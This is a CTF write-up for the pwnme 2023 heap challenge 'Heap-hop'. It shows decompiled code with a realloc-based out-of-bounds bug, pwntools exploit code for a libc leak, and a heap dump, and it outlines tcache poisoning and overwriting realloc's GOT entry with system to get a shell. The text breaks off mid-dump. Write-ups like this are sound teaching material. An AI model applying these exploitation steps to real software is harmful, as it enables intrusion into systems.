title = "[pwnme 2023 - pwn] Heap-hop | repr"
description = "Heap-Hop Solves: 31  Medium Heap exploitation is cool, and the best is when no free is used. >Try to pwn the challenge and get the flag remotely. Note:  You must spawn an instance to solve this cha"
full_description = '''[pwnme 2023 - pwn] Heap-hop 2023-05-07 pwn 2.6k words ctfheaplinuxnasmpwnpwnmetcache Heap-Hop Solves: 31 Medium Heap exploitation is cool, and the best is when no free is used. >Try to pwn the challenge and get the flag remotely. Note: You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT Author: Express#8049 Remote service at : nc 51.254.39.184 1336 Heap-hop is a heap exploitation challenge I did during the pwnme CTF. It involved classic tricks like tcache poisoning and GOT hiijacking. You can find the related files here. TL;DR Setup heap layout fill tcachebin for 0x400 sized chunks free large 0x400 sized chunk to get libc addresses oob read onto the chunk right before the large freed chunk => libc leak request a small 0x20 sized chunk that gets free right after, it falls at the begin of the chunk in the unsortedbin, oob read like just before => heap leak. tcache poisoning (we’re able to deal with safe-linking given we leaked heap) With the help of tcache poisoning, overwrite realloc@got to write &system realloc("/bin/sh") is then system("/binb/sh") What we have123456789101112131415161718$ checksec --file ./heap-hop[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/heap/heap-hop' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'/home/nasm/Documents/pwn/pwnme/heap'$ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.Copyright (C) 2022 Free Software Foundation, Inc.This is free software; see the source for copying conditions.There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR APARTICULAR PURPOSE.Compiled by GNU CC version 11.2.0.libc ABIs: UNIQUE IFUNC ABSOLUTEFor bug reporting instructions, please see:<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>. What we can see is that a recent libc is provided (which means with safe-linking) and that the binary isn’t PIE. Code reviewHere is basically the main logic of the binary: 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **argv, const char **envp){ unsigned int input_int; // [rsp+Ch] [rbp-4h] puts("[+] Welcome to hip-hop, you can create and listen to heap-hop music"); do { printf("%s", "Make your choice :\n\t- 1. Create a track.\n\t- 2. Read a track.\n\t- 3. Edit a track.\n> "); input_int = read_input_int(); if ( input_int == 3 ) { handle_edit(); } else { if ( input_int > 3 ) goto LABEL_10; if ( input_int == 1 ) { handle_create(); continue; } if ( input_int == 2 ) handle_read(); elseLABEL_10: quit = 1; } } while ( quit != 1 ); return puts("[?] Goodbye.");} Basic layout for a heap exploitation challenge, we’re allowed to create, read and edit a given track. As we already read in the initial statement we apparently cannot free a track. Let’s first take a look at the create function: 12345678910111213141516171819202122232425262728293031323334353637383940unsigned __int64 handle_create(){ void *v0; // rdx unsigned int idx; // [rsp+Ch] [rbp-14h] BYREF chunk_t *buf; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); idx = 0; printf("Enter the tracklist ID\n> "); __isoc99_scanf("%d", &idx); if ( idx > 0x100 ) _exit(1); if ( tracks[idx] ) { puts("[!] track already exists.\n"); } else { buf = (chunk_t *)malloc(0x30uLL); if ( !buf ) _exit(1); printf("Enter the tracklist name\n> "); read(0, buf, 0x20uLL); printf("Enter the tracklist content length\n> "); __isoc99_scanf("%ld", &buf->size); if ( buf->size > 0x480uLL ) _exit(1); v0 = malloc(buf->size); buf->track = (__int64)v0; if ( !buf->track ) _exit(1); printf("Enter the tracklist content\n> "); if ( !read(0, (void *)buf->track, buf->size) ) _exit(1); tracks[idx] = buf; puts("[+] track successfully created.\n"); } return v4 - __readfsqword(0x28u);} It crafts a chunk, and then allocates a chunk for a given size (< 0x480). The read function is very basic: 1234567891011121314151617181920212223unsigned __int64 handle_read(){ unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); v1 = 0; printf("Enter the tracklist ID\n> "); __isoc99_scanf("%d", &v1); if ( v1 > 0x100 ) _exit(1); if ( tracks[v1] ) { puts("[+] track content :"); write(1, (const void *)tracks[v1]->track, tracks[v1]->size); puts(&byte_4020FF); } else { puts("[!] track doesn't exist.\n"); } return v2 - __readfsqword(0x28u);} It prints tracks[v1]->size bytes from tracks[v1]->track. Which means no need to worry about badchars for the leak. The bug lies in the handle_edit function: 1234567891011121314151617181920212223242526272829303132unsigned __int64 handle_edit(){ chunk_t *v0; // rbx unsigned int idx; // [rsp+Ch] [rbp-24h] BYREF size_t size; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); idx = 0; size = 0LL; printf("Enter the tracklist ID\n> "); __isoc99_scanf("%d", &idx); if ( idx > 0x100 ) _exit(1); if ( tracks[idx] ) { printf("Enter the new tracklist content length\n> "); __isoc99_scanf("%ld", &size); if ( size > 0x480 ) _exit(1); v0 = tracks[idx]; v0->track = (__int64)realloc((void *)v0->track, size); printf("Enter the new tracklist content\n> "); read(0, (void *)tracks[idx]->track, tracks[idx]->size); puts("[+] track content edited."); } else { puts("[!] track doesn't exist.\n"); } return v4 - __readfsqword(0x28u);} There are two bugs, or at least interesting behaviours around realloc. First there is an out of bound (oob) read / write, indeed if we give a size smaller than tracks[idx]->size, then v0->track could be changed to a smaller chunk and thus read(0, (void *)tracks[idx]->track, tracks[idx]->size); could write over the end of the chunk. Secondly we can free a chunk by giving zero to the size. ExploitationGiven tcache poisoning seems to be pretty easy to achieve, we need to find where we could use our arbitrary write. If you remind well, the binary isn’t PIE based and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call realloc("/bin/sh"). This way we need to get a heap and a libc leak. libc leakTo get a libc leak we can fill the tcache and free a large chunk to make appear libc addresses on the heap and then read it through the oob read. Which gives: 123456789101112131415161718192021222324252627282930create(0, b"", 5, b"0")# Step one, 7 chunks to fill tcache laterfor i in range(7): create(1+i, b"", 0x400, str(i).encode())# small chunk which will be used to the oob r/wcreate(8+1, b"", 0x20, b"_")# victim chunkcreate(9+1, b"", 0x400, b"_")# chunk with big size that will be used for the oob r/wcreate(10+1, b"", 0x200, b"barreer")create(10+2, b"", 0x20, b"barree2")# fill tcachefor i in range(7): free(1+i)# oob chunk free(8+1)free(11) # we free in order that at the next edit it actually allocates a new chunkedit(11, 0x20, b"_") # allocated in 9free(9+1) # falls in the unsortedbinread(11) # oob readio.recv(0x70)libc.address = pwn.unpack(io.recv(8)) - 0x219ce0 The heap looks like this: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201210x1d83120 0x0000000000000000 0x0000000000000041 ........A....... <= chunk used to get the oob r/w0x1d83130 0x000000000000000a 0x0000000000000000 ................ 0x1d83140 0x0000000000000000 0x0000000000000000 ................ 0x1d83150 0x0000000000000020 0x0000000000000000 ...............0x1d83160 0x0000000000000000 0x0000000000000031 ........1....... <= track buffer of the chunk used to get the oob r/w0x1d83170 0x0000000000000a5f 0x0000000000000000 _............... 0x1d83180 0x0000000000000000 0x0000000000000000 ................ 0x1d83190 0x0000000000000000 0x0000000000000041 ........A....... <= victim chunk, size: 0x400, its track field is fell into the unsortedbin0x1d831a0 0x000000000000000a 0x0000000000000000 ................ 0x1d831b0 0x0000000000000000 0x0000000000000000 ................ 0x1d831c0 0x0000000000000400 0x0000000000000000 ................ 0x1d831d0 0x0000000000000000 0x0000000000000411 ................ <-- unsortedbin[all][0] 0x1d831e0 0x00007f0eb218dce0 0x00007f0eb218dce0 ................ 0x1d831f0 0x0000000000000000 0x0000000000000000 ................ 0x1d83200 0x0000000000000000 0x0000000000000000 ................ 0x1d83210 0x0000000000000000 0x0000000000000000 ................ 0x1d83220 0x0000000000000000 0x0000000000000000 ................ 0x1d83230 0x0000000000000000 0x0000000000000000 ................ 0x1d83240 0x0000000000000000 0x0000000000000000 ................ 0x1d83250 0x0000000000000000 0x0000000000000000 ................ 0x1d83260 0x0000000000000000 0x0000000000000000 ................ 0x1d83270 0x0000000000000000 0x0000000000000000 ................ 0x1d83280 0x0000000000000000 0x0000000000000000 ................ 0x1d83290 0x0000000000000000 0x0000000000000000 ................ 0x1d832a0 0x0000000000000000 0x0000000000000000 ................ 0x1d832b0 0x0000000000000000 0x0000000000000000 ................ 0x1d832c0 0x0000000000000000 0x0000000000000000 ................ 0x1d832d0 0x0000000000000000 0x0000000000000000 ................ 0x1d832e0 0x0000000000000000 0x0000000000000000 ................ 0x1d832f0 0x0000000000000000 0x0000000000000000 ................ 0x1d83300 0x0000000000000000 0x0000000000000000 ................ 0x1d83310 0x0000000000000000 0x0000000000000000 ................ 0x1d83320 0x0000000000000000 0x0000000000000000 ................ 0x1d83330 0x0000000000000000 0x0000000000000000 ................ 0x1d83340 0x0000000000000000 0x0000000000000000 ................ 0x1d83350 0x0000000000000000 0x0000000000000000 ................ 0x1d83360 0x0000000000000000 0x0000000000000000 ...............